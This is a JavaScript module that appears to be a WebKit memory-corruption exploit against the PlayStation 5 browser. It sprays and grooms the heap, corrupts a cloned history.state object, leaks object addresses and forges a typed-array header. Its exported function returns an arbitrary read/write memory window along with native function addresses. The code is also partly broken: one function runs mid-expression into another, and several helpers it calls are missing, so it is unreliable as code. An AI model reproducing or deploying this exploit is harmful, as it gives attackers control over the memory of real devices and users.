"use strict";

const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const LEAK_STRING_LENGTH = 924176;
const CELL_BYTES = 0x30;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;
const MEMORY_WINDOW_SIZE = 0x100;
const CANARY_OFFSET = 0x20;
const LEAK_SLOT_OFFSET = 0x20;

const symbolToString = Symbol.prototype.toString;
const viewHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);
const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c, 0xde, 0xad, 0xbe, 0xef]);
const identityBytes = new Uint8Array(8);
const nativeTarget = parseInt;

let attemptNumber = 0;
let keepIndex = 0;
let keepAlive = null;
let onEvent = null;
let settleResolve = null;
let memoryView = null;
let memoryMirror = null;
let targetView = null;
let fakeHost = null;
let markerObjectA = null;
let targetHolder = null;
let outerGraph = null;
let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let Math_floor = Math.floor;
let Math_isFinite = Number.isFinite;
let Number_isSafeInteger = Number.isSafeInteger;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureError = null;
let predecessorWords = null;
let liveCandidate = null;
 
function hex(v) { 
  return "0x" + v.toString(16).padStart(16, "0"); 
}

function buffer(s) { 
  return new ArrayBuffer(s); 
}

function allZero(b, s, e) { 
  for (let i = s; i < e; ++i) { 
    if (b[i] !== 0) return false; 
  } 
  return true; 
}

function usesLegacyWebKit() { 
  return /PlayStation 5\/[0-8]\./.test(navigator.userAgent); 
}

function fillerBigIntCount() { 
  if (!usesLegacyWebKit()) return 1; 
  var idx = (attemptNumber - 1) % 4; 
  if (idx < 0) idx += 4; 
  switch (idx) { 
    case 0: return 2; 
    case 1: return 4; 
    case 2: return 6; 
    case 3: return 7; 
    default: return 1; 
  } 
}

function uint32At(b, o) { 
  return (b[o] + b[o + 1] * 0x100) + (b[o + 2] + b[o + 3] * 0x100) * 0x10000; 
}

function low48At(b, o) { 
  return uint32At(b, o) + (b[o + 4] + b[o + 5] * 0x100) * 0x100000000; 
}

function readBytes(d, s, c) { 
  for (let i = 0; i < c; ++i) d[i] = s[i]; 
}

function sameBytes(l, r, c) { 
  for (let i = 0; i < c; ++i) { 
    if (l[i] !== r[i]) return false; 
  } 
  return true; 
}

// === 修復點一：展開排版，補齊 scratchWords 陣列索引 ===
function redirectView(c, a) { 
  const h = Math_floor(a / 0x100000000); 
  scratchWords[0] = a - h * 0x100000000; 
  scratchWords[1] = h; 
  for (let i = 0; i < 8; ++i) {
    c[0x10 + i] = scratchBytes[i]; 
  }
}

function restoreView(c) { 
  for (let i = 0; i < 8; ++i) c[0x10 + i] = viewHeader[0x10 + i]; 
}

function pointerFromWords(w, o) { 
  if (w[o + 3] !== 0) return NaN; 
  return (w[o] + w[o + 1] * 0x10000) + w[o + 2] * 0x100000000; 
}

function plausibleCell(v) { 
  return plausibleAddress(v) && v % 8 === 0; 
}

function plausibleAddress(v) { 
  return Number_isSafeInteger(v) && v > 4294967296 && v = 0x100 && id < 0x08000000; 
}

function validViewLayout() { 
  if (!usesLegacyWebKit()) return allZero(viewHeader, 0x20, 0x28); 
  return allZero(viewHeader, 0x1c, 0x20) && viewHeader[0x20] <= 3 && allZero(viewHeader, 0x21, 0x28); 
}

function inspectViewHeader() { 
  const v = low48At(viewHeader, 0x10); 
  if (!validStructure(viewHeader) || !plausibleAddress(low48At(viewHeader, 0x08)) || !plausibleAddress(v) || uint32At(viewHeader, 0x18) !== MEMORY_WINDOW_SIZE || !validViewLayout()) return null; 
  return v; 
}

// === 修復點三：補齊 scratchDouble 陣列索引 ===
function makeUpgradedHeader() { 
  for (let i = 0; i < 8; i++) scratchBytes[i] = viewHeader[i]; 
  const f = scratchBytes[6] + scratchBytes[7] * 0x100 - 2; 
  scratchBytes[6] = f & 0xff; 
  scratchBytes[7] = (f >> 8) & 0xff; 
  const v = scratchDouble[0]; 
return Math_isFinite(v) ? v : null;
}
function inspectHolder(c, h) {
redirectView(c, h);
readBytes(holderHeader, memoryView, HOLDER_BYTES);
if (!sameBytes(holderHeader, memoryView, HOLDER_BYTES)) return null;
let fa = null;
for (let o = 0x10; o <= 0x38; o += 8) {
const addr = low48At(holderHeader, o);
if (!canonicalLow48(holderHeader, o) || !plausibleCell(addr)) return null;
if (o === 0x10) fa = addr;
}
return fa;
}
// === 修復點四：補齊 targetHeader 的屬性識別類型 ===
function inspectFunction(c, a) {
redirectView(c, a);
readBytes(targetHeader, memoryView, 0x20);
const ex = low48At(targetHeader, 0x18);
if (!validStructure(targetHeader) || !plausibleAddress(low48At(targetHeader, 0x08)) || !plausibleAddress(low48At(targetHeader, 0x10)) || !plausibleCell(ex)) return null;
return { executable: ex, type: targetHeader[5] };
}
function inspectNativeExecutable(c, a) {
redirectView(c, a);
readBytes(targetHeader, memoryView, NATIVE_EXECUTABLE_BYTES);
const nf = low48At(targetHeader, 0x28);
const nc = low48At(targetHeader, 0x30);
if (!validStructure(targetHeader) || !canonicalLow48(targetHeader, 0x28) || !canonicalLow48(targetHeader, 0x30) || !plausibleAddress(nf) || !plausibleAddress(nc) || nf === nc) return null;
return { nativeFunction: nf, nativeConstructor: nc, type: targetHeader[5] };
}
function rejectRedirected(c, r) {
restoreView(c);
return invalidClone(r, false);
}
function inspectClonedGraph(h) {
let clone = null;
let candidate = null;
let hr = false;
let vr = false;
try {
clone = history.state;
if (clone.length !== 0x50001) {
clone[DUPLICATE_INDEX] = undefined;
return invalidClone("Unexpected length", true);
}
if (clone[1] === clone[DUPLICATE_INDEX]) {
clone[DUPLICATE_INDEX] = undefined;
clearPointerSpray();
return { status: "unchanged", safe: true };
}
candidate = clone[DUPLICATE_INDEX];
clone[DUPLICATE_INDEX] = undefined;
clone = null;
readBytes(viewHeader, candidate, CELL_BYTES);
hr = true;
const ov = inspectViewHeader();
if (ov === null) {
const s = allZero(viewHeader, 0, CELL_BYTES);
return invalidClone("Invalid header", s);
}
vr = true;
const id = isOurCorruptedView(candidate, ov);
vr = false;
if (!id) return invalidClone("Wrong view", false);
const nh = makeUpgradedHeader();
if (nh === null) return invalidClone("Invalid flags", false);
fakeHost.q0 = nh;
if (fakeHost.q0 !== nh) return invalidClone("Update failed", false);
vr = true;
const nta = inspectHolder(candidate, h);
if (nta === null) return rejectRedirected(candidate, "Invalid holder");
const fi = inspectFunction(candidate, nta);
if (fi === null) return rejectRedirected(candidate, "Invalid function");
const ni = inspectNativeExecutable(candidate, fi.executable);
if (ni === null) return rejectRedirected(candidate, "Invalid executable");
globalThis.__ps5NativeCtor = ni.nativeConstructor;
redirectView(candidate, nta);
const fm = low48At(memoryView, 0x18) === fi.executable && memoryView[5] === fi.type;
redirectView(candidate, fi.executable);
const nm = low48At(memoryView, 0x28) === ni.nativeFunction && low48At(memoryView, 0x30) === ni.nativeConstructor && memoryView[5] === ni.type;
restoreView(candidate);
vr = false;
if (!fm || !nm || memoryView[0] !== 0x3c || memoryMirror[0] !== 0x3c || targetView[0] !== 0xa5) {
return invalidClone("Check failed", false);
}
liveCandidate = candidate;
clearPointerSpray();
return { status: "ready", originalVector: ov, functionAddress: nta, executableAddress: fi.executable, nativeInfo: ni };
} catch (error) {
const s = candidate === null && clone === null && !hr && (error ? error.name === "TypeError" : false);
if (clone !== null) { try { clone[DUPLICATE_INDEX] = undefined; } catch(e) {} }
if (candidate !== null && hr && vr) { try { restoreView(candidate); } catch(e) {} }
try { targetView[0] = 0xa5; memoryMirror[0] = 0x3c; } catch(e) {}
try { clearPointerSpray(); } catch(e) {}
return { status: "error", safe: s, error: error };
}
}
function groomHeap(f, h) {
let outcome;
try {
const ch = new MessageChannel();
ch.port1.close();
ch.port2.close();
for (let i = 0; i < 512; i++) keepAlive[keepIndex++] = buffer(0x10000);
let slab = buffer(0x400000);
ch.port1.postMessage(0, [slab]);
slab = null;
const bh1 = buffer(0x81000);
const bh2 = buffer(0x81000);
const sep = buffer(0x10000);
const eh = buffer(0x70000);
const gd = buffer(0x90000);
const pred = buffer(0x80000);
const fh = buffer(0x80000);
fillPointerSpray(pred, f);
keepAlive[keepIndex++] = sep;
keepAlive[keepIndex++] = gd;
keepAlive[keepIndex++] = pred;
ch.port1.postMessage(0, [bh1, bh2, eh, fh]);
outcome = inspectClonedGraph(h);
} catch (error) {
try { clearPointerSpray(); } catch(e) {}
outcome = { status: "error", safe: true, error: error };
}
finishAttempt(outcome, h, f);
}
function finishAddressLeak() {
if (captureError !== null) return finishEarlySafeAttempt("Address leak failed", captureError ? (captureError.name + ": " + String(captureError.message).slice(0, 80)) : "錯誤");
if (copiedLength === 0) return finishEarlySafeAttempt("Address leak did not finish");
if ((copiedLength & 0xffffff) !== (LEAK_STRING_LENGTH & 0xffffff)) return finishEarlySafeAttempt("Unexpected length", "got " + copiedLength);
const hostAddress = pointerFromWords(capturedWords, 0);
const holderAddress = pointerFromWords(capturedWords, 4);
if (hostAddress !== pointerFromWords(capturedWords, 8) || holderAddress !== pointerFromWords(capturedWords, 12) || hostAddress === holderAddress || !plausibleCell(hostAddress) || !plausibleCell(holderAddress)) return finishEarlySafeAttempt("Invalid addresses");
const fakeAddress = hostAddress + 0x10;
if (!plausibleCell(fakeAddress)) return finishEarlySafeAttempt("Invalid fake address", hex(hostAddress));
groomHeap(fakeAddress, holderAddress);
}
function finishAttempt(o, h, f) {
if (o.status === "error") { emit("Failed", String(o.error ? o.error.message : o.error), "error"); return retry("Heap placement failed", o.safe); }
if (o.status === "unchanged") return retry("Clone was not corrupted", true);
if (o.status === "invalid") return retry(o.reason, o.safe);
if (o.status !== "ready" || liveCandidate === null) { emit("Failed", "Validation failed", "error"); liveCandidate = null; return retry("Validation failed", false); }
try { history.replaceState(null, ""); } catch(e) {}
const res = settleResolve;
settleResolve = null;
if (res !== null) res(createMemoryWindow(h));
emit("leak_addr", hex(h + LEAK_SLOT_OFFSET), "success");
emit("host_addr", hex(f - 0x10), "success");
emit("holder_addr", hex(h), "success");
emit("fake_addr", hex(f), "success");
emit("view_vector", hex(o.originalVector), "success");
emit("function_addr", hex(o.functionAddress), "success");
emit("executable_addr", hex(o.executableAddress), "success");
emit("native_function", hex(o.nativeInfo.nativeFunction), "success");
emit("native_constructor", hex(o.nativeInfo.nativeConstructor), "success");
}
function createMemoryWindow(h) {
return {
setAddress: function(a) {
if (liveCandidate === null) throw new Error("Live failed");
if (!plausibleAddress(a)) throw new RangeError("Invalid address");
redirectView(liveCandidate, a);
},
resetAddress: function() {
if (liveCandidate === null) throw new Error("Live failed");
restoreView(liveCandidate);
},
bytes: memoryView,
size: MEMORY_WINDOW_SIZE,
leakAddress: h + LEAK_SLOT_OFFSET,
setLeakObject: function(v) { targetHolder.q2 = v; },
clearLeakObject: function() { targetHolder.q2 = markerObjectA; }
};
}
export function establishPrimitive(e) {
if (settleResolve !== null) return Promise.reject(new Error("Running"));
if (typeof BigInt !== "function" || typeof MessageChannel !== "function" || typeof Symbol !== "function" || typeof history === "undefined" || typeof history.replaceState !== "function") return Promise.reject(new Error("Unsupported"));
onEvent = typeof e === "function" ? e : null;
attemptNumber = 1;
return new Promise(function(r) {
settleResolve = r;
startAttempt();
});
}
